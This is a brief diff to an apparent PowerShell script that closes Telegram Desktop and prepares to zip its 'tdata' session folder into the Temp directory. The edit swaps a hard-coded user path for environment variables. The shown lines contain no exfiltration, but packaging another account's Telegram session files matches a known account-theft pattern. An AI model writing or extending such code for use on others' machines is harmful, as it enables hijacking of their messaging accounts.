@@ -1,6 +1,6 @@
 # Parameters
-$tdataFolder = "C:\Users\Noname\AppData\Roaming\Telegram Desktop\tdata"
-$archivePath = "C:\Users\Noname\AppData\Local\Temp\tdata.zip"
+$tdataFolder = Join-Path $env:APPDATA "Telegram Desktop\tdata"
+$archivePath = Join-Path $env:TEMP "tdata.zip"
 
 # Close Telegram (if it is open)
 Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process
